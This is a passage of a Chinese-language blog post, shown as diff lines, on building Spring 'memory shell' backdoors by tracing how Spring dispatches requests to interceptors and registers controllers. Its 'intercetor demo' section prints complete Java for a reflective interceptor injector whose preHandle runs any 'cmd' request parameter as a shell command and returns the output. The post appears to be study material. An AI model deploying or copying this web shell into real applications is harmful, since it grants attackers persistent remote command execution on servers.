+<p>Spring 2.5 开始到 Spring 3.1 之前一般使用 <code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code> 映射器处理静态资源请求；</p>
+<p>Spring 3.1 开始及以后一般开始使用新的 <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持<code>@Contoller</code>和<code>@RequestMapping</code>注解。</p>
+<p>所以我们要这样获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="intercetor内存马"><a href="#intercetor内存马" class="headerlink" title="intercetor内存马"></a>intercetor内存马</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们来看看intercetor的生成和调用吧</p>
+<p>我们把断点打到filter层的最后一步<code>org.apache.catalina.core.ApplicationFilterChain</code>的<code>internalDoFilter</code></p>
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250116001501089.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:1049, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:978, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1014, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:903, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:564, HttpServlet (jakarta.servlet.http)</span><br><span class="line">service:885, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:658, HttpServlet (jakarta.servlet.http)</span><br><span class="line">internalDoFilter:195, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:140, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:116, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:164, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:140, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:101, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:164, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:140, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:101, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:164, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:140, ApplicationFilterChain (org.apache.catalina.core)</span><br></pre></td></tr></table></figure>
+
+<p>我们看到doDispatch这里，上面就是tomcat过程一样的</p>
+<p>为了方便分析，可把方法代码简化如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">processedRequest</span> <span class="operator">=</span> request;</span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">mappedHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ......</span><br><span class="line">            <span class="comment">// Determine handler for the current request.</span></span><br><span class="line">            mappedHandler = getHandler(processedRequest);</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">            <span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">            <span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">            <span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Actually invoke the handler.</span></span><br><span class="line">            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">            mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先跟进getHandler</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerMappings.iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var2.hasNext()) &#123;</span><br><span class="line">            <span class="type">HandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> (HandlerMapping)var2.next();</span><br><span class="line">            <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">            <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> handler;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他会不断遍历handlerMappings，然后getHandler</p>
+<p>我们进getHandler，然后跟进getHandlerExecutionChain</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">executionChain</span> <span class="operator">=</span> <span class="built_in">this</span>.getHandlerExecutionChain(handler, request);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> &#123;</span><br><span class="line">    HandlerExecutionChain var10000;</span><br><span class="line">    <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> HandlerExecutionChain handlerExecutionChain) &#123;</span><br><span class="line">        var10000 = handlerExecutionChain;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var10000 = <span class="keyword">new</span> <span class="title class_">HandlerExecutionChain</span>(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">chain</span> <span class="operator">=</span> var10000;</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.adaptedInterceptors.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var7.hasNext()) &#123;</span><br><span class="line">        <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> (HandlerInterceptor)var7.next();</span><br><span class="line">        <span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor mappedInterceptor) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mappedInterceptor.matches(request)) &#123;</span><br><span class="line">                chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.addInterceptor(interceptor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就是遍历adaptedInterceptors然后把他addInterceptor，我们找到interceptor加进去的地方了</p>
+<p>我们只需要反射获取adaptedInterceptors，然后修改就行。</p>
+<p>我们现在去找怎么调用interceptor</p>
+<p>我们把拦截器加进去后，我们会到dodispatch，我们来到if </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!mappedHandler.applyPreHandle(processedRequest, response)) </span><br></pre></td></tr></table></figure>
+
+<p>跟进applyPreHandle</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">applyPreHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.interceptorList.size(); <span class="built_in">this</span>.interceptorIndex = i++) &#123;</span><br><span class="line">        <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> (HandlerInterceptor)<span class="built_in">this</span>.interceptorList.get(i);</span><br><span class="line">        <span class="keyword">if</span> (!interceptor.preHandle(request, response, <span class="built_in">this</span>.handler)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.triggerAfterCompletion(request, response, (Exception)<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就是遍历所有的拦截器，然后执行preHandle，ok这里就是我们放恶意函数的地方，后面就不说了</p>
+<p>我贴下流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest</span><br><span class="line">    ↓</span><br><span class="line">Filter (Servlet Filter)</span><br><span class="line">    ↓</span><br><span class="line">DispatcherServlet (service -&gt; doDispatch)</span><br><span class="line">    ↓</span><br><span class="line">HandlerMapping (找到处理器)</span><br><span class="line">    ↓</span><br><span class="line">HandlerInterceptor (preHandle)</span><br><span class="line">    ↓</span><br><span class="line">HandlerAdapter (适配处理器)</span><br><span class="line">    ↓</span><br><span class="line">Aspect (AOP 切面)</span><br><span class="line">    ↓</span><br><span class="line">Controller (执行具体方法)</span><br><span class="line">    ↓</span><br><span class="line">HandlerInterceptor (postHandle)</span><br><span class="line">    ↓</span><br><span class="line">ViewResolver (解析视图)</span><br><span class="line">    ↓</span><br><span class="line">Render (渲染视图)</span><br><span class="line">    ↓</span><br><span class="line">HandlerInterceptor (afterCompletion)</span><br><span class="line">    ↓</span><br><span class="line">Filter</span><br><span class="line">    ↓</span><br><span class="line">HttpResponse</span><br></pre></td></tr></table></figure>
+
+<h3 id="intercetor-demo"><a href="#intercetor-demo" class="headerlink" title="intercetor demo"></a>intercetor demo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.lang.Nullable;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line">import org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class InjectToInterceptor extends AbstractTranslet implements HandlerInterceptor &#123;</span><br><span class="line">    public InjectToInterceptor() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获得context</span><br><span class="line">            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">            //获取 adaptedInterceptors 属性值</span><br><span class="line">            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(&quot;requestMappingHandlerMapping&quot;);</span><br><span class="line">            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);</span><br><span class="line">            InjectToInterceptor aaa = new InjectToInterceptor(&quot;aaa&quot;);</span><br><span class="line">            adaptedInterceptors.add(aaa);</span><br><span class="line">        &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public InjectToInterceptor(String aaaa)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if (cmd != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                java.io.PrintWriter writer = response.getWriter();</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                if (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, cmd&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                p.redirectErrorStream(true);</span><br><span class="line">                Process process = p.start();</span><br><span class="line">                Scanner s = new Scanner(process.getInputStream());</span><br><span class="line">                String result = s.useDelimiter(&quot;\\A&quot;).hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                writer.println(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception &#123;</span><br><span class="line">        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex) throws Exception &#123;</span><br><span class="line">        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用有参构造是因为，用无参会递归调用</p>
+<h2 id="Controller-内存马"><a href="#Controller-内存马" class="headerlink" title="Controller 内存马"></a>Controller 内存马</h2><h3 id="controller创建过程"><a href="#controller创建过程" class="headerlink" title="controller创建过程"></a>controller创建过程</h3><p>bean的周期</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bean init</span><br><span class="line">调用 afterPropertiesSet 或 initMethod</span><br><span class="line">Bean 使用中...</span><br><span class="line">调用 destroy 或 destroyMethod</span><br></pre></td></tr></table></figure>
+
+<p>我们把断点打到<code>AbstractHandlerMethodMapping#afterPropertiesSet</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.initHandlerMethods();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initHandlerMethods</span><span class="params">()</span> &#123;</span><br><span class="line">    String[] var1 = <span class="built_in">this</span>.getCandidateBeanNames();</span><br><span class="line">    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> var1.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var2; ++var3) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> var1[var3];</span><br><span class="line">        <span class="keyword">if</span> (!beanName.startsWith(<span class="string">&quot;scopedTarget.&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.processCandidateBean(beanName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.handlerMethodsInitialized(<span class="built_in">this</span>.getHandlerMethods());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就是先获取符合条件的bean</p>
+<p>然后不断遍历，我们进入processCandidateBean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processCandidateBean</span><span class="params">(String beanName)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; beanType = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        beanType = <span class="built_in">this</span>.obtainApplicationContext().getType(beanName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logger.trace(<span class="string">&quot;Could not resolve type for bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>, var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (beanType != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.isHandler(beanType)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.detectHandlerMethods(beanName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取bean的类型，isHandler看看他是否有controller或RequestMapping注解，如果是我们进入detectHandlerMethods</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">detectHandlerMethods</span><span class="params">(Object handler)</span> &#123;</span><br><span class="line">    Class var10000;</span><br><span class="line">    <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String beanName) &#123;</span><br><span class="line">        var10000 = <span class="built_in">this</span>.obtainApplicationContext().getType(beanName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var10000 = handler.getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; handlerType = var10000;</span><br><span class="line">    <span class="keyword">if</span> (handlerType != <span class="literal">null</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line">        Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType, (method) -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.getMappingForMethod(method, userType);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid mapping on handler class [&quot;</span> + userType.getName() + <span class="string">&quot;]: &quot;</span> + method, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logger.trace(<span class="built_in">this</span>.formatMappings(userType, methods));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.mappingsLogger.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mappingsLogger.debug(<span class="built_in">this</span>.formatMappings(userType, methods));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        methods.forEach((method, mapping) -&gt; &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">invocableMethod</span> <span class="operator">=</span> AopUtils.selectInvocableMethod(method, userType);</span><br><span class="line">            <span class="built_in">this</span>.registerHandlerMethod(handler, invocableMethod, mapping);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>学习链接</p>
+<p><a target="_blank" rel="noopener" href="https://landgrey.me/blog/19/">https://landgrey.me/blog/19/</a></p>
+<p><a target="_blank" rel="noopener" href="https://landgrey.me/blog/12/">https://landgrey.me/blog/12/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
